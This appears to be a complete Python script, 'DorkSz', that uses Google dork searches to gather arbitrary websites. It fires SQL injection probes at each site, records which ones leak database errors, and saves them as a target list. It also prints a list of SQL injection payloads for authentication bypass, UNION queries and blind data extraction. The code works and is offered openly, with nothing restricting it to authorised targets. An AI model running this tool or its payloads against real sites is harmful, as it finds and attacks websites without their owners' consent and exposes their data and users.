#!/usr/bin/env python3
"""
DorkSz - SQL Injection Vulnerability Scanner
A tool for finding websites vulnerable to SQL injection using Google dorking
Author: HadsXdevPy (Updated version)
Thanks To: Haz3ll and Xn5
Version: 4.0
"""

import os
import sys
import platform
import argparse
import logging
from typing import List, Optional

# Color definitions
class Colors:
    GREEN = "\33[0;32m"
    GREEN_LIGHT = "\33[32;1m"
    BLUE = "\33[0;36m"
    BLUE_LIGHT = "\33[36;1m"
    RED = "\33[31;1m"
    WHITE = "\33[37;1m"
    BLACK = "\33[30;1m"
    YELLOW = "\33[33;1m"
    YELLOW_LIGHT = "\33[1;33m"
    RESET = "\33[0m"

# Logo
LOGO = r"""
  ______                    __      _______
 |   _  \   .-----. .----. |  |--. |   _   | .-----.
 |.  |   \  |  _  | |   _| |    <  |___|   | |__ --|
 |.  |    \ |_____| |__|   |__|__|  /  ___/  |_____|
 |:  1    /                        |:  1  \
 |::.. . /                         |::.. . |
 `------'                          `-------'
"""

# Version
VERSION = "4.0"
AUTHOR = "HadsXdevPy"

def clear_screen():
    """Clear screen cross-platform"""
    try:
        if platform.system() == 'Windows':
            os.system('cls')
        else:
            os.system('clear')
    except Exception as e:
        logging.warning(f"Could not clear screen: {e}")

def print_banner():
    """Print application banner"""
    print(Colors.RED + LOGO)
    print(Colors.YELLOW_LIGHT + 'Author     : ' + Colors.WHITE + AUTHOR)
    print(Colors.YELLOW_LIGHT + 'Thanks To  : ' + Colors.WHITE + 'Haz3ll and Xn5')
    print(Colors.YELLOW_LIGHT + 'Version    : ' + Colors.WHITE + VERSION)
    print()

def check_dependencies():
    """Check if required dependencies are installed"""
    try:
        import googlesearch
        import requests
        return True
    except ImportError as e:
        print(f"{Colors.RED}[ERROR] Missing dependency: {e}")
        print(f"{Colors.YELLOW}Please install dependencies using: pip install -r requirements.txt")
        return False

def validate_dork(dork: str) -> bool:
    """Validate dork input"""
    if not dork or not dork.strip():
        print(f"{Colors.RED}[ERROR] Dork cannot be empty!")
        return False
    if len(dork) < 3:
        print(f"{Colors.RED}[ERROR] Dork too short!")
        return False
    return True

def test_sql_injection(url: str, payload: str = "'", timeout: int = 10) -> bool:
    """Test if a URL is vulnerable to SQL injection"""
    try:
        import requests
        response = requests.get(url + payload, timeout=timeout)
        
        # Common SQL error patterns
        sql_errors = [
            'mysql_fetch_array',
            'mysql_num_rows',
            'mysql_error',
            'mysqli_error',
            'mysqli_fetch_array',
            'PostgreSQL query failed',
            'Warning: pg_',
            'valid MySQL result',
            'MySqlClient.',
            'syntax error',
            'ORA-',
            'Oracle error',
            'Oracle driver',
            'Warning: oci_',
            'SQLite3::',
            'sqlite_',
            'SQLite error',
            'Warning: SQLite3::',
            'Microsoft OLE DB Provider',
            'ODBC SQL Server Driver',
            'SQL Server',
            'Unclosed quotation mark',
            'Microsoft OLE DB Provider for ODBC Drivers error',
            'syntax;',
            'mysql_',
            'mysqli_',
            'pg_',
            'sqlite_'
        ]
        
        response_text = response.text.lower()
        for error in sql_errors:
            if error.lower() in response_text:
                return True
        return False
        
    except requests.exceptions.RequestException as e:
        logging.debug(f"Request failed for {url}: {e}")
        return False
    except Exception as e:
        logging.debug(f"Unexpected error testing {url}: {e}")
        return False

def search_with_dork(dork: str, max_results: int = 100, delay: float = 1.0) -> List[str]:
    """Search for URLs using Google dork"""
    try:
        from googlesearch import search
        urls = []
        print(f"{Colors.BLUE}[INFO] Searching for URLs with dork: {dork}")
        
        for url in search(dork, num_results=max_results, pause=delay):
            urls.append(url)
            
        return urls
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Search failed: {e}")
        return []

def save_results(vulnerable_urls: List[str], output_file: str, format_type: str = 'txt'):
    """Save vulnerable URLs to file in various formats"""
    try:
        if format_type == 'txt':
            with open(output_file, 'w', encoding='utf-8') as f:
                for url in vulnerable_urls:
                    f.write(url + '\n')
        elif format_type == 'csv':
            import csv
            with open(output_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['URL', 'Vulnerability_Type', 'Scan_Date'])
                for url in vulnerable_urls:
                    writer.writerow([url, 'SQL_Injection', ''])
        elif format_type == 'json':
            import json
            data = {
                'scan_info': {
                    'tool': 'DorkSz',
                    'version': VERSION,
                    'scan_date': '',
                    'total_vulnerable': len(vulnerable_urls)
                },
                'vulnerable_urls': vulnerable_urls
            }
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        
        print(f"{Colors.GREEN_LIGHT}[SUCCESS] Results saved to: {output_file} (format: {format_type})")
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Could not save results: {e}")

def scan_vulnerabilities(urls: List[str], payload: str = "'", timeout: int = 10, delay: float = 0.5) -> List[str]:
    """Scan URLs for SQL injection vulnerabilities"""
    vulnerable_urls = []
    total_urls = len(urls)
    
    print(f"{Colors.BLUE}[INFO] Scanning {total_urls} URLs for SQL injection vulnerabilities...")
    print(f"{Colors.BLUE}[INFO] Using payload: '{payload}', timeout: {timeout}s, delay: {delay}s")
    
    for i, url in enumerate(urls, 1):
        print(f"{Colors.YELLOW}[{i}/{total_urls}] Testing: {url[:50]}...")
        
        if test_sql_injection(url, payload, timeout):
            print(f"{Colors.BLUE}[{Colors.GREEN_LIGHT}✓{Colors.BLUE}]{Colors.GREEN_LIGHT} VULNERABLE: {url}")
            vulnerable_urls.append(url)
        else:
            print(f"{Colors.RED}[x] NOT VULNERABLE: {url}")
        
        # Add delay between requests to be respectful
        if delay > 0 and i < total_urls:
            import time
            time.sleep(delay)
    
    return vulnerable_urls

def print_common_payloads():
    """Print common SQL injection payloads"""
    payloads = [
        "'",
        "''",
        "1'",
        "1''",
        "1' OR '1'='1",
        "1' OR '1'='1' --",
        "1' OR '1'='1' #",
        "1' OR '1'='1'/*",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "' OR 'a'='a",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR '1'='1--",
        "') OR ('1'='1--",
        "1' OR '1'='1",
        "1' OR 1 -- -",
        "1' OR 1=1--",
        "1' OR 1=1#",
        "1' OR 1=1/*",
        "1'xor'1'='1",
        "1' AND (SELECT COUNT(*) FROM users) > 0--",
        "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
        "1' AND LENGTH(DATABASE()) > 0--",
        "1' AND SUBSTRING(DATABASE(),1,1) = 'a'--"
    ]
    
    print(f"\n{Colors.YELLOW_LIGHT}=== Common SQL Injection Payloads ==={Colors.RESET}")
    print(f"{Colors.BLUE}Total payloads: {len(payloads)}{Colors.RESET}\n")
    
    for i, payload in enumerate(payloads, 1):
        print(f"{Colors.WHITE}[{i:2d}] {Colors.GREEN_LIGHT}{payload}{Colors.RESET}")
    
    print(f"\n{Colors.YELLOW}Usage: python3 DorkSz.py -d \"inurl:admin.php?id=\" --payload \"YOUR_PAYLOAD\"{Colors.RESET}")
    print(f"{Colors.YELLOW}Example: python3 DorkSz.py -d \"inurl:admin.php?id=\" --payload \"'\"{Colors.RESET}\n")

def check_for_updates():
    """Check for updates (placeholder function)"""
    print(f"\n{Colors.YELLOW_LIGHT}=== Update Check ==={Colors.RESET}")
    print(f"{Colors.BLUE}Current version: {VERSION}{Colors.RESET}")
    print(f"{Colors.YELLOW}Update checking is not implemented in this version.{Colors.RESET}")
    print(f"{Colors.WHITE}Please check the repository manually for updates.{Colors.RESET}\n")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='DorkSz - SQL Injection Vulnerability Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 DorkSz.py -d "inurl:admin.php?id=" -o results.txt
  python3 DorkSz.py -d "inurl:product.php?id=" --max-results 50 --timeout 15
  python3 DorkSz.py -d "inurl:news.php?id=" --payload "'" --delay 1.0 -v
  python3 DorkSz.py --list-payloads
  python3 DorkSz.py --update
        """
    )
    
    parser.add_argument('-d', '--dork',
                       help='Google dork to search for vulnerable sites',
                       required=False)
    parser.add_argument('-o', '--output',
                       help='Output file for vulnerable URLs (default: vuln.txt)',
                       default='vuln.txt')
    parser.add_argument('--max-results',
                       help='Maximum number of results to search (default: 100)',
                       type=int,
                       default=100)
    parser.add_argument('--timeout',
                       help='Request timeout in seconds (default: 10)',
                       type=int,
                       default=10)
    parser.add_argument('--delay',
                       help='Delay between requests in seconds (default: 0.5)',
                       type=float,
                       default=0.5)
    parser.add_argument('--payload',
                       help='SQL injection payload to test (default: \')',
                       default="'")
    parser.add_argument('--format',
                       help='Output format: txt, csv, json (default: txt)',
                       choices=['txt', 'csv', 'json'],
                       default='txt')
    parser.add_argument('--search-delay',
                       help='Delay between Google searches (default: 1.0)',
                       type=float,
                       default=1.0)
    parser.add_argument('--list-payloads',
                       help='List common SQL injection payloads',
                       action='store_true')
    parser.add_argument('--update',
                       help='Check for updates',
                       action='store_true')
    parser.add_argument('--no-banner',
                       help='Hide banner',
                       action='store_true')
    parser.add_argument('--quiet',
                       help='Quiet mode (minimal output)',
                       action='store_true')
    parser.add_argument('-v', '--verbose',
                       help='Enable verbose output',
                       action='store_true')
    parser.add_argument('--version',
                       help='Show version information',
                       action='version',
                       version=f'DorkSz v{VERSION} by {AUTHOR}')
    
    args = parser.parse_args()
    
    # Handle special commands
    if args.list_payloads:
        print_common_payloads()
        return
    
    if args.update:
        check_for_updates()
        return
    
    # Setup logging
    if args.quiet:
        log_level = logging.ERROR
    elif args.verbose:
        log_level = logging.DEBUG
    else:
        log_level = logging.INFO
    
    logging.basicConfig(level=log_level, format='%(asctime)s - %(levelname)s - %(message)s')
    
    # Clear screen and print banner (unless quiet mode)
    if not args.quiet and not args.no_banner:
        clear_screen()
        print_banner()
    
    # Check dependencies
    if not check_dependencies():
        sys.exit(1)
    
    # Get dork from args or prompt user
    if args.dork:
        dork = args.dork
    else:
        dork = input(f"{Colors.RED}[{Colors.BLUE}+{Colors.RED}]{Colors.YELLOW_LIGHT} Enter your dork: {Colors.WHITE}")
    
    # Validate dork
    if not validate_dork(dork):
        sys.exit(1)
    
    # Search for URLs
    urls = search_with_dork(dork, args.max_results, args.search_delay)
    
    if not urls:
        print(f"{Colors.RED}[ERROR] No URLs found or search failed!")
        sys.exit(1)
    
    print(f"{Colors.BLUE}[INFO] Found {len(urls)} URLs to test")
    
    # Scan for vulnerabilities
    vulnerable_urls = scan_vulnerabilities(urls, args.payload, args.timeout, args.delay)
    
    # Summary
    print(f"\n{Colors.YELLOW_LIGHT}=== SCAN SUMMARY ===")
    print(f"{Colors.BLUE}Total URLs tested: {len(urls)}")
    print(f"{Colors.GREEN_LIGHT}Vulnerable URLs found: {len(vulnerable_urls)}")
    print(f"{Colors.RED}Not vulnerable: {len(urls) - len(vulnerable_urls)}")
    
    # Save results
    if vulnerable_urls:
        save_results(vulnerable_urls, args.output, args.format)
        if not args.quiet:
            print(f"{Colors.GREEN_LIGHT}Vulnerable URLs have been saved to: {args.output}")
    else:
        if not args.quiet:
            print(f"{Colors.YELLOW}No vulnerable URLs found.")
    
    if not args.quiet:
        print(f"\n{Colors.YELLOW_LIGHT}Scan completed!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[INFO] Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Unexpected error: {e}")
        if logging.getLogger().isEnabledFor(logging.DEBUG):
            logging.exception("Full traceback:")
        sys.exit(1)
